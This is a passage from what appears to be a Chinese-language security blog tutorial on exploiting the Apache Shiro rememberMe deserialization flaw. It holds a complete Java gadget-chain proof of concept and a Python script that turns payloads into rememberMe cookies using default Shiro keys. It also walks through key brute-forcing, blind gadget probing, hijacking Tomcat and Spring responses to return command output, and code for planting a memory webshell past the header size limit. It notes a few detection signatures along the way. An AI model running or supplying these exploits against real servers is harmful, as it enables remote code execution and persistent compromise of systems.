javassist.CtClass;</span><br><span class="line">import org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"></span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line">public class AttrCompareCBPOC &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        byte[] maliciousBytes = generateMaliciousClass(&quot;calc.exe&quot;);</span><br><span class="line"></span><br><span class="line">        TemplatesImpl templates = new TemplatesImpl();</span><br><span class="line">        setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][]&#123;maliciousBytes&#125;);</span><br><span class="line">        setFieldValue(templates, &quot;_name&quot;, &quot;MaliciousClass&quot;);</span><br><span class="line">        setFieldValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line">        AttrCompare attrCompare = new AttrCompare();</span><br><span class="line"></span><br><span class="line">        BeanComparator beanComparator = new BeanComparator(null, attrCompare);</span><br><span class="line"></span><br><span class="line">        AttrNSImpl attr = new AttrNSImpl(new CoreDocumentImpl(), &quot;1&quot;, &quot;1&quot;, &quot;1&quot;);</span><br><span class="line"></span><br><span class="line">        PriorityQueue queue = new PriorityQueue(2, beanComparator);</span><br><span class="line">        queue.add(attr);</span><br><span class="line">        queue.add(attr);</span><br><span class="line"></span><br><span class="line">        setFieldValue(beanComparator, &quot;property&quot;, &quot;outputProperties&quot;);</span><br><span class="line">        setFieldValue(queue, &quot;queue&quot;, new Object[]&#123;templates, templates&#125;);</span><br><span class="line"></span><br><span class="line">        byte[] data = serialize(queue);</span><br><span class="line">        System.out.println(&quot;[+] Serialized size: &quot; + data.length);</span><br><span class="line">        System.out.println(&quot;[+] Using: AttrCompare + AttrNSImpl&quot;);</span><br><span class="line"></span><br><span class="line">        deserialize(data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static byte[] generateMaliciousClass(String cmd) throws Exception &#123;</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));</span><br><span class="line">        CtClass ctClass = pool.makeClass(&quot;MaliciousClass&quot;);</span><br><span class="line">        ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        ctClass.makeClassInitializer().insertBefore(&quot;Runtime.getRuntime().exec(\&quot;&quot; + cmd + &quot;\&quot;);&quot;);</span><br><span class="line">        byte[] bytes = ctClass.toBytecode();</span><br><span class="line">        ctClass.detach();</span><br><span class="line">        return bytes;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception &#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(true);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static byte[] serialize(Object obj) throws IOException &#123;</span><br><span class="line">        ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(baos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        return baos.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static Object deserialize(byte[] data) throws Exception &#123;</span><br><span class="line">        return new ObjectInputStream(new ByteArrayInputStream(data)).readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<img src="/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260420030635049.png" class="" title="image-20260420030635049">
+
+<h4 id="serialVersionUID的问题"><a href="#serialVersionUID的问题" class="headerlink" title="serialVersionUID的问题"></a>serialVersionUID的问题</h4><p>  Java反序列化时，如果服务端和Payload的类<strong>serialVersionUID不一致</strong>，会抛出以下的报错：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">java.io.InvalidClassException: </span><br><span class="line">    local class incompatible: </span><br><span class="line">    stream classdesc serialVersionUID = xxxx, </span><br><span class="line">    local class serialVersionUID = yyyy</span><br></pre></td></tr></table></figure>
+
+<p>​    这里直接引入P牛的话：如果两个不同版本的库使用了同一个类，而这两个类可能有一些方法和属性有了变化，此时在序列化通信的时候就可能因为不兼容导致出现隐患。因此，Java在反序列化的时候提供了一个机制，序列化时会根据固定算法计算出一个当前类的 serialVersionUID 值，写入数据流中；反序列化时，如果发现对方的环境中这个类计算出的 serialVersionUID 不同，则反序列化就会异常退出，避免后续的未知隐患。</p>
+<p>​    所以出现这个原因大多数情况就是攻击方和服务端使用的CB包版本不一致导致的结果。我们打开java-chains看链子，你会看到他有很多不同版本的CB链，原因就是处理这个serialVersionUID的问题。</p>
+<img src="/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260420032344045.png" class="" title="image-20260420032344045">
+
+<p>  那著名的反序列化工具ysoserial有没有做到怎么解决这个问题，我们发现他其实并没有解决这个serialVersionUID的问题。我们观看源码他只为了CB1.9.2来做了配置其他的版本其实并没有兼容。所以会有出现利用不了的情况。</p>
+<img src="/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260420032922135.png" class="" title="image-20260420032922135">
+
+<h3 id="编写shiro加密并反序列化"><a href="#编写shiro加密并反序列化" class="headerlink" title="编写shiro加密并反序列化"></a>编写shiro加密并反序列化</h3><p>  从前面我们得知了怎么解密 就是base64解码-aes解密还原。那我们加密就是逆着来，即aes加密-base64编码。根据我们前面的图解章节，我让ai根据要求自写了一个脚本。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line">import os</span><br><span class="line">import base64</span><br><span class="line">import argparse</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">from Crypto.Util.Padding import pad</span><br><span class="line"></span><br><span class="line">def aes_encrypt(data, key):</span><br><span class="line">    iv = os.urandom(16)</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    encrypted = cipher.encrypt(pad(data, AES.block_size))</span><br><span class="line">    return iv + encrypted</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    parser = argparse.ArgumentParser(</span><br><span class="line">        description=&#x27;Shiro RememberMe AES Encrypt Tool&#x27;,</span><br><span class="line">        formatter_class=argparse.RawDescriptionHelpFormatter,</span><br><span class="line">        epilog=&#x27;&#x27;&#x27;</span><br><span class="line">Examples:</span><br><span class="line">  python3 shiroser.py -ser ser.bin</span><br><span class="line">  python3 shiroser.py -key &quot;kPH+bIxk5D2deZiIxcaaaA==&quot; -ser ser.bin</span><br><span class="line">  python3 shiroser.py -k &quot;4AvVhmFLUs0KTA3Kprsdag==&quot; -s payload.bin</span><br><span class="line">        &#x27;&#x27;&#x27;</span><br><span class="line">    )</span><br><span class="line">    </span><br><span class="line">    parser.add_argument(&#x27;-k&#x27;, &#x27;--key&#x27;, </span><br><span class="line">                        default=&#x27;kPH+bIxk5D2deZiIxcaaaA==&#x27;,</span><br><span class="line">                        help=&#x27;AES key (default: kPH+bIxk5D2deZiIxcaaaA==)&#x27;)</span><br><span class="line">    </span><br><span class="line">    parser.add_argument(&#x27;-s&#x27;, &#x27;--ser&#x27;, </span><br><span class="line">                        required=True,</span><br><span class="line">                        help=&#x27;Serialized payload file path&#x27;)</span><br><span class="line">    </span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    </span><br><span class="line">    try:</span><br><span class="line">        key = base64.b64decode(args.key)</span><br><span class="line">        if len(key) != 16:</span><br><span class="line">            print(f&quot;[!] Error: AES key must be 16 bytes, got &#123;len(key)&#125; bytes&quot;)</span><br><span class="line">            sys.exit(1)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(f&quot;[!] Error decoding key: &#123;e&#125;&quot;)</span><br><span class="line">        sys.exit(1)</span><br><span class="line">    </span><br><span class="line">    if not os.path.exists(args.ser):</span><br><span class="line">        print(f&quot;[!] Error: File not found: &#123;args.ser&#125;&quot;)</span><br><span class="line">        sys.exit(1)</span><br><span class="line">    </span><br><span class="line">    with open(args.ser, &#x27;rb&#x27;) as f:</span><br><span class="line">        serialized_data = f.read()</span><br><span class="line">    </span><br><span class="line">    encrypted_data = aes_encrypt(serialized_data, key)</span><br><span class="line">    </span><br><span class="line">    remember_me = base64.b64encode(encrypted_data).decode()</span><br><span class="line">    </span><br><span class="line">    print(f&quot;[*] AES Key (Base64): &#123;args.key&#125;&quot;)</span><br><span class="line">    print(f&quot;[*] AES Key (Hex): &#123;key.hex()&#125;&quot;)</span><br><span class="line">    print(f&quot;[*] Payload File: &#123;args.ser&#125;&quot;)</span><br><span class="line">    print(f&quot;[*] Payload Size: &#123;len(serialized_data)&#125; bytes&quot;)</span><br><span class="line">    print(f&quot;[*] Encrypted Size: &#123;len(encrypted_data)&#125; bytes&quot;)</span><br><span class="line">    print(&quot;-&quot; * 60)</span><br><span class="line">    print(&quot;[+] RememberMe Cookie Value:&quot;)</span><br><span class="line">    print(remember_me)</span><br><span class="line">    print(&quot;-&quot; * 60)</span><br><span class="line">    print(&quot;[+] Full Cookie Header:&quot;)</span><br><span class="line">    print(f&quot;rememberMe=&#123;remember_me&#125;&quot;)</span><br><span class="line">    print(&quot;-&quot; * 60)</span><br><span class="line">    </span><br><span class="line">    output_file = &quot;rememberMe.txt&quot;</span><br><span class="line">    with open(output_file, &#x27;w&#x27;) as f:</span><br><span class="line">        f.write(f&quot;rememberMe=&#123;remember_me&#125;&quot;)</span><br><span class="line">    print(f&quot;[+] Saved to: &#123;output_file&#125;&quot;)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>用法是：python3 shiroser.py –key “kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;” –ser cb.bin  这里key是指定的密钥，ser参数是反序列化之后的文件。</p>
+<p>  这里我们拿第一个无依赖的源码去生成ser.bin文件。这里跑的时候你需要把源码的反序列化的函数给注释</p>
+<img src="/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260420033010139.png" class="" title="image-20260420033010139">
+
+<p>然后放到bp那里发包</p>
+<img src="/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260420033037591.png" class="" title="image-20260420033037591">
+
+<h3 id="漏洞利用和攻击"><a href="#漏洞利用和攻击" class="headerlink" title="漏洞利用和攻击"></a>漏洞利用和攻击</h3><p>  这里面我介绍以下这几款工具吧：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/vulhub/java-chains</span><br><span class="line">https://github.com/SummerSec/ShiroAttack2</span><br><span class="line">https://github.com/lingxisec/ShiroAttack2_bypass (针对第二个作者工具的二开)</span><br></pre></td></tr></table></figure>
+
+<h4 id="爆破key"><a href="#爆破key" class="headerlink" title="爆破key"></a>爆破key</h4><p>  这里爆破Key的话，java-chains是没这功能的。ShiroAttack2是有这个功能的，不过他会先检测你是否有Shiro框架在爆破。这里就是检查Shiro框架的方法，原理也很简单就随便在rememberme输入点东西，有deleteme就返回有shiro框架。它这工具是rememberMe&#x3D;yes</p>
+<img src="/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260420052026351.png" class="" title="image-20260420052026351">
+
+<p>当出现这个请求头：rememberMe&#x3D;yes,也可以作为<strong>这个工具的弱特征来评判攻击者使用这个工具</strong>。</p>
+<img src="/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260420052106273.png" class="" title="image-20260420052106273">
+
+<p>利用如下。我们分析漏洞的时候，加密方式是为AES-CBC的。<strong>但是到了Shiro1.4.2 版本之后更改为了AES-GCM加密方式</strong>。所以我们看到这里也是支持GCM的加密的。</p>
+<img src="/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260420050146873.png" class="" title="image-20260420050146873">
+
+<p>  那这个工具它到底是通过什么来判断你是否爆破成功了呢？如果你爆破成功，则返回包不回显deleteme而且它有正确回显，如果爆破失败则会有。</p>
+<p>  这是爆破成功的截图</p>
+<img src="/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260420051706266.png" class="" title="image-20260420051706266">
+
+<p>爆破失败的截图</p>
+<img src="/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260420051800462.png" class="" title="image-20260420051800462">
+
+<p>这里的逻辑如图所示：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">┌─────────────────────────────────────────────────────────────────┐</span><br><span class="line">│                        密钥爆破流程                              │</span><br><span class="line">├─────────────────────────────────────────────────────────────────┤</span><br><span class="line">│                                                                 │</span><br><span class="line">│  ┌──────────────┐    ┌──────────────┐    ┌──────────────┐      │</span><br><span class="line">│  │ 读取密钥字典  │───→│ 遍历每个密钥  │───→│ 序列化对象   │      │</span><br><span class="line">│  │shiro_keys.txt│    │              │    │SimplePrincipal│     │</span><br><span class="line">│  └──────────────┘    └──────────────┘    └──────────────┘      │</span><br><span class="line">│                                                   │             │</span><br><span class="line">│                                                   ▼             │</span><br><span class="line">│  ┌──────────────┐    ┌──────────────┐    ┌──────────────┐      │</span><br><span class="line">│  │ 判断结果     │←───│ 发送HTTP请求 │←───│ AES加密      │      │</span><br><span class="line">│  │              │    │ Cookie:      │    │ CBC 或 GCM   │      │</span><br><span class="line">│  └──────────────┘    │ rememberMe=  │    └──────────────┘      │</span><br><span class="line">│         │            └──────────────┘                           │</span><br><span class="line">│         ▼                                                       │</span><br><span class="line">│  ┌──────────────────────────────────────────────────────┐      │</span><br><span class="line">│  │ 响应包含 &quot;=deleteMe&quot; → 密钥错误，继续下一个            │      │</span><br><span class="line">│  │ 响应不含 &quot;=deleteMe&quot; → 密钥正确，爆破成功              │      │</span><br><span class="line">│  └──────────────────────────────────────────────────────┘      │</span><br><span class="line">│                                                                 │</span><br><span class="line">└─────────────────────────────────────────────────────────────────┘</span><br></pre></td></tr></table></figure>
+
+<h4 id="爆破和探测Gadget链"><a href="#爆破和探测Gadget链" class="headerlink" title="爆破和探测Gadget链"></a>爆破和探测Gadget链</h4><p>  这里使用ShiroAttack2就直接选择爆破利用链就行了。因为我们项目的CB链是1.8.3的，所以只有183的版本能成功，同理使用java-  chains也是一样的。要选择1.8.3的gadget链。下面就仅介绍java chains的两模块来探测Gadget链。</p>
+<img src="/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260420054104100.png" class="" title="image-20260420054104100">
+
+<p>那我们实际在服务器上 测试的时候那是不可能弹计算器出来的，我们可以通过java-chains的sleep模块来判断能不能执行命令。</p>
+<img src="/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260420055655973.png" class="" title="image-20260420055655973">
+
+<p>这里需要根据需求来填，默认sleep为5。生成之后的结果可以直接在数据包上发。</p>
+<img src="/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260420055727559.png" class="" title="image-20260420055727559">
+
+<p>我们观察右下角的返回包时间，可以看到休眠了十秒才回显证明了这个CB183模块可以利用的。</p>
+<img src="/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260420055832481.png" class="" title="image-20260420055832481">
+
+<p>我们还可以选择DNSlog链来进行回显判断。我们选择DNSlog的模块，然后一定要填自己的dnslog地址</p>
+<img src="/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260420060137025.png" class="" title="image-20260420060137025">
+
+<p>  回显则代表探测成功</p>
+<img src="/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260420060154748.png" class="" title="image-20260420060154748">
+
+<h4 id="Shiro反序列化回显"><a href="#Shiro反序列化回显" class="headerlink" title="Shiro反序列化回显"></a>Shiro反序列化回显</h4><p>  首先你要明白什么是java反序列化回显技术。这里也是列举了这方面的文章：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://gv7.me/articles/2020/semi-automatic-mining-request-implements-multiple-middleware-echo/</span><br><span class="line">https://github.com/pen4uin/java-echo-generator</span><br><span class="line">https://y4er.com/posts/java-deserialization-echo/#%E5%86%99%E5%9C%A8%E6%96%87%E5%89%8D</span><br><span class="line">https://xz.aliyun.com/news/11303</span><br><span class="line">https://reajason.eu.org/writing/tomcatechoshell/</span><br></pre></td></tr></table></figure>
+
+<p>   回显技术的本质就是：**在无直接输出的反序列化场景中，通过劫持当前请求上下文，将命令执行结果”注入”到HTTP响应中返回给攻击者。**所以怎么通过反序列化拿到request&#x2F;response对象成为了重中之重。但缺点就是每个中间件的实现都不太一样而且也会受到各个版本的差异可能无法做好的适配。。从普适性讲，一般都是tomcat&#x2F;spring为主。因为用的中间件也是最广的。具体的中间件挖掘回显可参考第一个链接。</p>
+<p> 这里是ShiroAttack2_bypass(二开版本) 它是怎么实现反序列化回显的。我们下载它的源码进行查看。来到HeaderBypassService.execCmdEcho方法处可以看到 这是它的tomcat和spring回显逻辑。</p>
+<p>我们可以得知它是以Thread中挖掘request对象的。主要实现逻辑如下tomcat回显的实现</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// 1. 执行命令并Base64编码输出</span><br><span class="line">// 2. 从Thread.currentThread().getThreadGroup()获取所有线程</span><br><span class="line">// 3. 遍历找到名称包含&quot;http&quot;的线程</span><br><span class="line">// 4. 反射获取：target → this$0 → handler → global → processors</span><br><span class="line">// 5. 遍历processors获取req对象</span><br><span class="line">// 6. 调用req.getResponse()获取response</span><br><span class="line">// 7. 通过response.addHeader(&quot;X-C&quot;, base64Output)回显</span><br></pre></td></tr></table></figure>
+
+<p>  而spring回显，是使用了RequestContextHolder的API获取response对象。</p>
+<img src="/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260421002940516.png" class="" title="image-20260421002940516">
+
+<p>  后面就没什么好说的了。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">加密与发送</span><br><span class="line">byte[] classBytes = toCompatibleBytecode(c);      // 生成字节码</span><br><span class="line">  String encrypted = encryptBytesToRaw(classBytes, key);  // Shiro加密</span><br><span class="line">  String cookie = buildCookie(encrypted);           // 构建Cookie</span><br><span class="line">  HttpResponse resp = doSendRequest(cookie, ...);   // 发送请求</span><br><span class="line"></span><br><span class="line">获取回显 这里请求头是固定的：X-C</span><br><span class="line">String hv = resp.header(&quot;X-C&quot;);  // 从响应头获取Base64编码的命令输出</span><br><span class="line">  byte[] decoded = Base64.decode(hv);</span><br><span class="line">  String output = new String(decoded, Utils.guessEncoding(decoded));</span><br><span class="line">  log(output);  // 输出命令执行结果</span><br><span class="line">  </span><br><span class="line">  后面再做了Javassist 动态生成恶意类 以供Gadget使用。</span><br></pre></td></tr></table></figure>
+
+<p>  所以流程就是：有关回显的代码模块使用Javassist动态生成字节码，然后字节码提供给了TemplatesImpl的_bytecodes字段在这里做了封装。封装TemplatesImpl之后由于CB链会用到TemplatesImpl，后续就跟Gadget反序列化链联系上来了，在后面就是AES加密，base64编码。 我们选择回显链来打并开启代理抓包。我们自己手动添加这个X-C请求头。我们发现命令是经过base64编码的，我们解码后发现命令执行成功，这里X-C应该是固定的，后续也可以作为特征来判断是否使用了这个二开。</p>
+<img src="/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260421005003948.png" class="" title="image-20260421005003948">
+
+<img src="/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260421005120813.png" class="" title="image-20260421005120813">
+
+
+
+<p>  这里我们继续介绍使用java-chains的回显模块，这里是使用了java-echo-generator的模块去回显的。这里注意选择对应的中间件，请求头和参数是可以指定的，我们这里默认就好，然后生成直接复制到请求包上。</p>
+<img src="/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260420230638526.png" class="" title="image-20260420230638526">
+
+<p>我这里修改之后的请求头是echo。<strong>有些模块利用不了，可以多试试</strong>。</p>
+<img src="/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260421010210589.png" class="" title="image-20260421010210589">
+
+<h4 id="Shiro打内存马的坑"><a href="#Shiro打内存马的坑" class="headerlink" title="Shiro打内存马的坑"></a>Shiro打内存马的坑</h4><p>  如果我们选择java-chains的模块，直接打内存马会发生的效果？java-chains已经支持了我大哥的memshellparty，使用这个模块生成内存马的时候报了400的问题。我们往下一翻报错核心其实就是一句话：<strong>Request header is too large</strong>。就是我们的payload太长了，导致请求头太长报的错。究其原因是因为tomcat的 maxHttpHeaderSize的默认值只有 4096 个字节(4k） payload的⻓度超过了就报错了。</p>
+<p>  改成这样就能过去了，但是不是有点自欺欺人了。。所以这里讲两种办法怎么绕过。</p>
+<img src="/2026/04/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20260421140517583.png" class="" title="image-20260421140517583">
+
+<h5 id="反射修改maxHttpHeaderSize"><a href="#反射修改maxHttpHeaderSize" class="headerlink" title="反射修改maxHttpHeaderSize"></a>反射修改maxHttpHeaderSize</h5><p>   我们在<a target="_blank" rel="noopener" href="https://github.com/yyhuni/shiroMemshell">https://github.com/yyhuni/shiroMemshell</a> 找到这个项目使用idea打开。找到shiroattack项目打开。</p>
+<p>然后我们自写一个反射修改headsize的文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">package com.govuln.shiroattack.memshell;</span><br><span class="line"></span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line">import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line">import com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line">public class TomcatHeaderSize extends AbstractTranslet &#123;</span><br><span class="line"></span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            java.lang.reflect.Field contextField = org.apache.catalina.core.StandardContext.class.getDeclaredField(&quot;context&quot;);</span><br><span class="line">            java.lang.reflect.Field serviceField = org.apache.catalina.core.ApplicationContext.class.getDeclaredField(&quot;service&quot;);</span><br><span class="line">            java.lang.reflect.Field requestField = org.apache.coyote.RequestInfo.class.getDeclaredField(&quot;req&quot;);</span><br><span class="line">            java.lang.reflect.Field headerSizeField = org.apache.coyote.http11.Http11InputBuffer.class.getDeclaredField(&quot;headerBufferSize&quot;);</span><br><span class="line">            java.lang.reflect.Method getHandlerMethod = org.apache.coyote.AbstractProtocol.class.getDeclaredMethod(&quot;getHandler&quot;,null);</span><br><span class="line">            contextField.setAccessible(true);</span><br><span class="line">            headerSizeField.setAccessible(true);</span><br><span class="line">            serviceField.setAccessible(true);</span><br><span class="line">            requestField.setAccessible(true);</span><br><span class="line">            